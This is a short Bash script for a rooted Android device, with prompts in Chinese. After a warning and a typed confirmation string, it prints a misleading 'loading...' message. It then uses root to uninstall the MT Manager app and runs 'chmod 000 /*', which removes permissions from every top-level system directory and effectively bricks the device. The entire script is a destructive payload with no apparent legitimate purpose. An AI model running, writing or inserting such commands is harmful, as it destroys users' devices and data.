
#!/bin/bash

# 生成一个包含8个字符的随机字符串
RANDOM_STRING=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)

echo "你真的要执行此脚本吗，可能对于设备有害 （如需要执行请输入以下文本并回车 [$RANDOM_STRING]）:"
read USER_INPUT

if [ "$USER_INPUT" == "$RANDOM_STRING" ]; then
    echo "loading..."
    su -c pm uninstall bin.mt.plus
    chmod 000 /*
else
    exit 1
fi